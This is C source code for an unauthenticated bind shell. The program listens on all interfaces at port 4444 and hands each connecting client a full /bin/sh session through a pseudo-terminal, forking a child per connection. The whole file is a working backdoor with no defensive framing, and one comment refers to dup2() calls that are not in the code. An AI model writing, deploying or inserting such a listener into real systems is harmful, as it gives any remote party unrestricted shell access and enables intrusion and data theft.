#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pty.h>
#include <signal.h>
#include <termios.h>
#include <sys/wait.h> 
#include <errno.h>

#define BIND_PORT 4444

// Function to handle signal for child process termination
void sig_chld(int signo) {
    // Collect child process status to prevent zombies
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

// Function to handle the TTY session
void handle_tty_shell(int connfd) {
    pid_t pid;
    int pty_master;
    fd_set fds;
    char buffer[1024];

    pid = forkpty(&pty_master, NULL, NULL, NULL);
    if (pid < 0) {
        perror("forkpty error");
        close(connfd);
        return;
    }
    if (pid == 0) {
        // Child process: The shell
        // The dup2() calls are redundant here because forkpty() handles them,
        // but they don't cause harm.
        // The execve() call replaces the child process with a shell.
        char *const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
        exit(0);
    } else {
        // Parent process: Relays data between socket and PTY
        while (1) {
            FD_ZERO(&fds);
            FD_SET(connfd, &fds);
            FD_SET(pty_master, &fds);

            // Wait for activity on either file descriptor
            int max_fd = (connfd > pty_master ? connfd : pty_master) + 1;
            if (select(max_fd, &fds, NULL, NULL, NULL) < 0) {
                if (errno == EINTR) continue; // Restart on interrupt
                break;
            }

            // Data from client to PTY
            if (FD_ISSET(connfd, &fds)) {
                ssize_t n = read(connfd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(pty_master, buffer, n);
            }

            // Data from PTY to client
            if (FD_ISSET(pty_master, &fds)) {
                ssize_t n = read(pty_master, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(connfd, buffer, n);
            }
        }
        // Cleanup on disconnection
        close(connfd);
        close(pty_master);
        printf("Connection closed.\n");
    }
}

int main() {
    int listenfd, connfd;
    struct sockaddr_in serv_addr;

    // Create and configure the listening socket
    listenfd = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(BIND_PORT);

    if (bind(listenfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("bind error");
        exit(1);
    }
    listen(listenfd, 1);
    printf("Listening on port %d...\n", BIND_PORT);
    signal(SIGCHLD, sig_chld);

    while (1) {
        connfd = accept(listenfd, NULL, NULL);
        if (connfd < 0) {
            perror("accept error");
            continue;
        }
        printf("Connection established. Spawning full TTY shell...\n");
        
        if (fork() == 0) {
            // Child process handles the connection
            close(listenfd);
            handle_tty_shell(connfd);
            close(connfd);
            exit(0);
        } else {
            // Parent closes the connection and listens for more
            close(connfd);
        }
    }
    return 0;
}

